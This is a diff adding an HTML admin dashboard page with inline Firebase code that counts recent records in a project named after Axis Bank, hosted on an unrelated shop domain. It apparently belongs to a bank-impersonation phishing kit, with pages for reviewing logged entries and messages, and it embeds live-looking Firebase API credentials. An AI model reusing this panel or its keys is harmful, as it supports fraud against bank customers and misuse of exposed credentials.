@@ -1,0 +1,466 @@
+
+<!doctype html>
+<html lang="en" data-bs-theme="blue-theme">
+
+
+<!-- Mirrored from codervent.com/maxton/demo/horizontal-menu/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 25 Feb 2025 19:36:46 GMT -->
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Admin Dashboard</title>
+  <!--favicon-->
+  <link rel="icon" href="https://walettepay.shop/anand_site/assets/images/favicon-32x32.png" type="image/png">
+  <!-- loader-->
+	<link href="https://walettepay.shop/anand_site/assets/css/pace.min.css" rel="stylesheet">
+	<script src="https://walettepay.shop/anand_site/assets/js/pace.min.js"></script>
+
+  <!--plugins-->
+  <link href="https://walettepay.shop/anand_site/assets/plugins/perfect-scrollbar/css/perfect-scrollbar.css" rel="stylesheet">
+  <link rel="stylesheet" type="text/css" href="https://walettepay.shop/anand_site/assets/plugins/metismenu/metisMenu.min.css">
+  <link rel="stylesheet" type="text/css" href="https://walettepay.shop/anand_site/assets/plugins/metismenu/mm-vertical.css">
+  <link rel="stylesheet" type="text/css" href="https://walettepay.shop/anand_site/assets/plugins/simplebar/css/simplebar.css">
+  <!--bootstrap css-->
+  <link href="https://walettepay.shop/anand_site/assets/css/bootstrap.min.css" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@300;400;500;600&amp;display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css?family=Material+Icons+Outlined" rel="stylesheet">
+  <!--main css-->
+  <link href="https://walettepay.shop/anand_site/assets/css/bootstrap-extended.css" rel="stylesheet">
+  <link href="https://walettepay.shop/anand_site/sass/main.css" rel="stylesheet">
+  <link href="https://walettepay.shop/anand_site/assets/css/horizontal-menu.css" rel="stylesheet">
+  <link href="https://walettepay.shop/anand_site/sass/dark-theme.css" rel="stylesheet">
+  <link href="https://walettepay.shop/anand_site/sass/blue-theme.css" rel="stylesheet">
+  <link href="https://walettepay.shop/anand_site/sass/semi-dark.css" rel="stylesheet">
+  <link href="https://walettepay.shop/anand_site/sass/bordered-theme.css" rel="stylesheet">
+  <link href="https://walettepay.shop/anand_site/sass/responsive.css" rel="stylesheet">
+
+ <!-- Include Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+
+    <script type="text/javascript">
+
+ if (!sessionStorage.getItem('userId')) {
+    window.location.href = 'index.html';
+}
+
+
+        // Your web app's Firebase configuration
+        var firebaseConfig = {
+            apiKey: "AIzaSyAyKJIHxV0dP6rAKluCvG4YRSND1IDd7h8",
+  authDomain: "axis-bank-new.firebaseapp.com",
+  databaseURL: "https://axis-bank-new-default-rtdb.firebaseio.com",
+  projectId: "axis-bank-new",
+  storageBucket: "axis-bank-new.firebasestorage.app",
+  messagingSenderId: "1011041344275",
+  appId: "1:1011041344275:web:635787bff2708395a718e6",
+  measurementId: "G-91SXZEE7R2"
+        };
+
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+
+        // Reference to the Firebase Realtime Database
+        var database = firebase.database();
+
+        // Function to fetch data
+        function fetchData() {
+            database.ref('axis03user').once('value').then(function(snapshot) {
+                var today = 0;
+                var lastweek = 0;
+                var oneDay = 24 * 60 * 60 * 1000; // Milliseconds in one day
+                var now = new Date();
+
+                snapshot.forEach(function(childSnapshot) {
+                    var entry = childSnapshot.val();
+                    var timestamp = entry.timestamp;
+                    
+                    if (timestamp) {
+                        var entryDate = new Date(timestamp);
+                        var diffDays = Math.round(Math.abs((now - entryDate) / oneDay));
+
+                        if (diffDays === 0) {
+                            today++;
+                        } else if (diffDays <= 7) {
+                            lastweek++;
+                        }
+                    }
+                });
+
+                // Update the HTML with the fetched data
+                document.getElementById('today').innerHTML = today;
+                document.getElementById('lastweek').innerHTML = lastweek;
+            });
+        }
+
+        // Call the function to fetch data when the page loads
+        window.onload = fetchData;
+    </script>
+</head>
+
+<body>
+
+  <!--start header-->
+ <header class="top-header">
+  <nav class="navbar navbar-expand align-items-center justify-content-between gap-4 border-bottom">
+    <div class="logo-header d-none d-xl-flex align-items-center gap-2">
+      <div class="logo-icon">
+        <img src="https://walettepay.shop/anand_site/assets/images/logo-icon.png" class="logo-img" width="45" alt="">
+      </div>
+      <div class="logo-name">
+        <h5 class="mb-0">Maxton</h5>
+      </div>
+    </div>
+    <div class="btn-toggle d-xl-none" data-bs-toggle="offcanvas" data-bs-target="#offcanvasNavbar">
+      <a href="https://walettepay.shop/anand_site/javascript:;"><i class="material-icons-outlined">menu</i></a>
+    </div>
+   
+   
+
+  </nav>
+</header>
+<!--end top header-->
+
+
+<!--navigation-->
+<div class="primary-menu">
+  <nav class="navbar navbar-expand-xl align-items-center">
+   <div class="offcanvas offcanvas-start w-260" tabindex="-1" id="offcanvasNavbar" aria-labelledby="offcanvasNavbarLabel">
+   <div class="offcanvas-header border-bottom h-70">
+     <div class="d-flex align-items-center gap-2">
+       <div class="">
+         <img src="https://walettepay.shop/anand_site/assets/images/logo-icon.png" class="logo-icon" width="45" alt="logo icon">
+       </div>
+       <div class="">
+         <h4 class="logo-text">Maxton</h4>
+       </div>
+     </div>
+     <a href="https://walettepay.shop/anand_site/javascript:;" class="primaery-menu-close" data-bs-dismiss="offcanvas">
+      <i class="material-icons-outlined">close</i>
+     </a>
+   </div>
+   <div class="offcanvas-body p-0">
+     <ul class="navbar-nav align-items-center flex-grow-1">
+     <li class="nav-item">
+       <a class="nav-link " href="dashboard.html">
+         <div class="parent-icon"><i class="material-icons-outlined">home</i>
+         </div>
+         <div class="menu-title d-flex align-items-center">Dashboard</div>
+       </a>
+   
+       </li>
+       <li class="nav-item">
+       <a class="nav-link" href="Log-Enteries.html">
+         <div class="parent-icon"><i class='material-icons-outlined'>apps</i>
+         </div>
+         <div class="menu-title d-flex align-items-center">Log Enteries</div>
+       </a>
+      
+       </li>
+       <li class="nav-item">
+       <a class="nav-link" href="Messages.html">
+         <div class="parent-icon"><i class='material-icons-outlined'>note_alt</i>
+         </div>
+         <div class="menu-title d-flex align-items-center">Messages</div>
+       </a>
+      
+       </li>
+       <li class="nav-item">
+       <a class="nav-link" href="Settings.html">
+         <div class="parent-icon"><i class='material-icons-outlined'>account_circle</i>
+         </div>
+         <div class="menu-title d-flex align-items-center">Settings</div>
+       </a>
+      
+       </li>
+       <li class="nav-item dropdown">
+       <a class="nav-link" href="Email.html">
+         <div class="parent-icon"><i class='material-icons-outlined'>medical_services</i>
+         </div>
+         <div class="menu-title d-flex align-items-center">Email</div>
+       </a>
+      
+       </li>
+       <li class="nav-item dropdown">
+       <a class="nav-link" href="Change-Password.html">
+         <div class="parent-icon"><i class='material-icons-outlined'>pie_chart</i>
+         </div>
+         <div class="menu-title d-flex align-items-center">Change Password</div>
+       </a>
+      
+       </li>
+       <li class="nav-item">
+       <a class="nav-link" href="Logout.html"   >
+         <div class="parent-icon"><i class='material-icons-outlined'>table_chart</i>
+         </div>
+         <div class="menu-title d-flex align-items-center">Logout</div>
+       </a>
+  
+       </li>
+     </ul>
+   </div>
+   </div>
+ </nav>
+</div>
+<!--end navigation-->
+
+  <!--start main wrapper-->
+  <main class="main-wrapper">
+    <div class="main-content">
+      <!--breadcrumb-->
+				<div class="page-breadcrumb d-none d-sm-flex align-items-center mb-3">
+					<div class="breadcrumb-title pe-3">Dashboard</div>
+					<div class="ps-3">
+						<nav aria-label="breadcrumb">
+							<ol class="breadcrumb mb-0 p-0">
+								<li class="breadcrumb-item"><a href="https://walettepay.shop/anand_site/javascript:;"><i class="bx bx-home-alt"></i></a>
+								</li>
+								<li class="breadcrumb-item active" aria-current="page">Statistics</li>
+							</ol>
+						</nav>
+					</div>
+			
+				</div>
+				<!--end breadcrumb-->
+     
+        <div class="row">
+          <div class="col-xxl-12 d-flex align-items-stretch">
+            <div class="card w-100 overflow-hidden rounded-4">
+              <div class="card-body position-relative p-4">
+                <div class="row">
+                  <div class="col-12 col-sm-7">
+                    <div class="d-flex align-items-center gap-3 mb-5">
+                      <img src="https://walettepay.shop/anand_site/assets/images/avatars/01.png" class="rounded-circle bg-grd-info p-1"  width="60" height="60" alt="user">
+                      <div class="">
+                        <p class="mb-0 fw-semibold">Welcome back</p>
+                        <h4 class="fw-semibold mb-0 fs-4 mb-0">Admin!</h4>
+                      </div>
+                    </div>
+           
+                  </div>
+                  <div class="col-12 col-sm-5">
+                    <div class="welcome-back-img pt-4">
+                       <img src="https://walettepay.shop/anand_site/assets/images/gallery/welcome-back-3.png" height="180" alt="">
+                    </div>
+                  </div>
+                </div><!--end row-->
+              </div>
+            </div>
+          </div>
+          
+          <div class="col-xl-3 col-xxl-3 d-flex align-items-stretch">
+            <div class="card w-100 rounded-4">
+              <div class="card-body">
+                <div class="d-flex align-items-start justify-content-between mb-3">
+                  <div class="">
+                    <h5 class="mb-0" id="today"></h5>
+                    <p class="mb-0">Total Enteries</p>
+                  </div>
+                  <div class="dropdown">
+                    <a href="https://walettepay.shop/anand_site/javascript:;" class="dropdown-toggle-nocaret options dropdown-toggle"
+                      data-bs-toggle="dropdown">
+                      <span class="material-icons-outlined fs-5">more_vert</span>
+                    </a>
+                    <ul class="dropdown-menu">
+                      <li><a class="dropdown-item" href="https://walettepay.shop/anand_site/javascript:;">Action</a></li>
+                      <li><a class="dropdown-item" href="https://walettepay.shop/anand_site/javascript:;">Another action</a></li>
+                      <li><a class="dropdown-item" href="https://walettepay.shop/anand_site/javascript:;">Something else here</a></li>
+                    </ul>
+                  </div>
+                </div>
+                <div class="chart-container2">
+                  <div id="chart2"></div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+
+          <div class="col-xl-3 col-xxl-3 d-flex align-items-stretch">
+            <div class="card w-100 rounded-4">
+              <div class="card-body">
+                <div class="d-flex align-items-start justify-content-between mb-3">
+                  <div class="">
+                    <h5 class="mb-0" id="lastweek"></h5>
+                    <p class="mb-0">Last Week's Entries</p>
+                  </div>
+                  <div class="dropdown">
+                    <a href="https://walettepay.shop/anand_site/javascript:;" class="dropdown-toggle-nocaret options dropdown-toggle"
+                      data-bs-toggle="dropdown">
+                      <span class="material-icons-outlined fs-5">more_vert</span>
+                    </a>
+                    <ul class="dropdown-menu">
+                      <li><a class="dropdown-item" href="https://walettepay.shop/anand_site/javascript:;">Action</a></li>
+                      <li><a class="dropdown-item" href="https://walettepay.shop/anand_site/javascript:;">Another action</a></li>
+                      <li><a class="dropdown-item" href="https://walettepay.shop/anand_site/javascript:;">Something else here</a></li>
+                    </ul>
+                  </div>
+                </div>
+                <div class="chart-container2">
+                  <div id="chart2"></div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+
+          <div class="col-xl-3 col-xxl-3 d-flex align-items-stretch">
+            <div class="card w-100 rounded-4">
+              <div class="card-body">
+                <div class="d-flex align-items-start justify-content-between mb-3">
+                  <div class="">
+                    <h5 class="mb-0" id="">0</h5>
+                    <p class="mb-0">Last Month's Entries</p>
+                  </div>
+                  <div class="dropdown">
+                    <a href="https://walettepay.shop/anand_site/javascript:;" class="dropdown-toggle-nocaret options dropdown-toggle"
+                      data-bs-toggle="dropdown">
+                      <span class="material-icons-outlined fs-5">more_vert</span>
+                    </a>
+                    <ul class="dropdown-menu">
+                      <li><a class="dropdown-item" href="https://walettepay.shop/anand_site/javascript:;">Action</a></li>
+                      <li><a class="dropdown-item" href="https://walettepay.shop/anand_site/javascript:;">Another action</a></li>
+                      <li><a class="dropdown-item" href="https://walettepay.shop/anand_site/javascript:;">Something else here</a></li>
+                    </ul>
+                  </div>
+                </div>
+                <div class="chart-container2">
+                  <div id="chart2"></div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+
+          <div class="col-xl-3 col-xxl-3 d-flex align-items-stretch">
+            <div class="card w-100 rounded-4">
+              <div class="card-body">
+                <div class="d-flex align-items-start justify-content-between mb-3">
+                  <div class="">
+                    <h5 class="mb-0" id="">0</h5>
+                    <p class="mb-0">This Year's Entries</p>
+                  </div>
+                  <div class="dropdown">
+                    <a href="https://walettepay.shop/anand_site/javascript:;" class="dropdown-toggle-nocaret options dropdown-toggle"
+                      data-bs-toggle="dropdown">
+                      <span class="material-icons-outlined fs-5">more_vert</span>
+                    </a>
+                    <ul class="dropdown-menu">
+                      <li><a class="dropdown-item" href="https://walettepay.shop/anand_site/javascript:;">Action</a></li>
+                      <li><a class="dropdown-item" href="https://walettepay.shop/anand_site/javascript:;">Another action</a></li>
+                      <li><a class="dropdown-item" href="https://walettepay.shop/anand_site/javascript:;">Something else here</a></li>
+                    </ul>
+                  </div>
+                </div>
+                <div class="chart-container2">
+                  <div id="chart2"></div>
+                </div>
+              </div>
+            </div>
+          </div>
+         
+        </div>
+
+
+
+    </div>
+  </main>
+  <!--end main wrapper-->
+
+  <!--start overlay-->
+     <div class="overlay btn-toggle"></div>
+  <!--end overlay-->
+
+   <!--start footer-->
+   <footer class="page-footer">
+    <p class="mb-0">Copyright © 2025. All right reserved.</p>
+  </footer>
+  <!--end footer-->
+
+
+  <!--start switcher-->
+  
+  <!--start switcher-->
+  <button class="btn btn-grd btn-grd-primary position-fixed bottom-0 end-0 m-3 d-flex align-items-center gap-2" type="button" data-bs-toggle="offcanvas" data-bs-target="#staticBackdrop">
+    <i class="material-icons-outlined">tune</i>Customize
+  </button>
+  
+  <div class="offcanvas offcanvas-end" data-bs-scroll="true" tabindex="-1" id="staticBackdrop">
+    <div class="offcanvas-header border-bottom h-70">
+      <div class="">
+        <h5 class="mb-0">Theme Customizer</h5>
+        <p class="mb-0">Customize your theme</p>
+      </div>
+      <a href="https://walettepay.shop/anand_site/javascript:;" class="primaery-menu-close" data-bs-dismiss="offcanvas">
+        <i class="material-icons-outlined">close</i>
+      </a>
+    </div>
+    <div class="offcanvas-body">
+      <div>
+        <p>Theme variation</p>
+
+        <div class="row g-3">
+          <div class="col-12 col-xl-6">
+            <input type="radio" class="btn-check" name="theme-options" id="BlueTheme" checked>
+            <label class="btn btn-outline-secondary d-flex flex-column gap-1 align-items-center justify-content-center p-4" for="BlueTheme">
+              <span class="material-icons-outlined">contactless</span>
+              <span>Blue</span>
+            </label>
+          </div>
+          <div class="col-12 col-xl-6">
+            <input type="radio" class="btn-check" name="theme-options" id="LightTheme">
+            <label class="btn btn-outline-secondary d-flex flex-column gap-1 align-items-center justify-content-center p-4" for="LightTheme">
+              <span class="material-icons-outlined">light_mode</span>
+              <span>Light</span>
+            </label>
+          </div>
+          <div class="col-12 col-xl-6">
+            <input type="radio" class="btn-check" name="theme-options" id="DarkTheme">
+            <label class="btn btn-outline-secondary d-flex flex-column gap-1 align-items-center justify-content-center p-4" for="DarkTheme">
+              <span class="material-icons-outlined">dark_mode</span>
+              <span>Dark</span>
+            </label>
+          </div>
+          <div class="col-12 col-xl-6">
+            <input type="radio" class="btn-check" name="theme-options" id="SemiDarkTheme">
+            <label class="btn btn-outline-secondary d-flex flex-column gap-1 align-items-center justify-content-center p-4" for="SemiDarkTheme">
+              <span class="material-icons-outlined">contrast</span>
+              <span>Semi Dark</span>
+            </label>
+          </div>
+          <div class="col-12 col-xl-6">
+            <input type="radio" class="btn-check" name="theme-options" id="BoderedTheme">
+            <label class="btn btn-outline-secondary d-flex flex-column gap-1 align-items-center justify-content-center p-4" for="BoderedTheme">
+              <span class="material-icons-outlined">border_style</span>
+              <span>Bordered</span>
+            </label>
+          </div>
+        </div><!--end row-->
+
+      </div>
+    </div>
+  </div>
+  <!--start switcher-->
+
+  <!--bootstrap js-->
+  <script src="https://walettepay.shop/anand_site/assets/js/bootstrap.bundle.min.js"></script>
+
+  <!--plugins-->
+  <script src="https://walettepay.shop/anand_site/assets/js/jquery.min.js"></script>
+  <!--plugins-->
+  <script src="https://walettepay.shop/anand_site/assets/plugins/perfect-scrollbar/js/perfect-scrollbar.js"></script>
+  <script src="https://walettepay.shop/anand_site/assets/plugins/metismenu/metisMenu.min.js"></script>
+  <script src="https://walettepay.shop/anand_site/assets/plugins/apexchart/apexcharts.min.js"></script>
+  <script src="https://walettepay.shop/anand_site/assets/plugins/simplebar/js/simplebar.min.js"></script>
+  <script src="https://walettepay.shop/anand_site/assets/plugins/peity/jquery.peity.min.js"></script>
+  <script>
+    $(".data-attributes span").peity("donut")
+  </script>
+  <script src="https://walettepay.shop/anand_site/assets/js/main.js"></script>
+  <script src="https://walettepay.shop/anand_site/assets/js/dashboard1.js"></script>
+  <script>
+	   new PerfectScrollbar(".user-list")
+  </script>
+
+</body>
+
+</html>
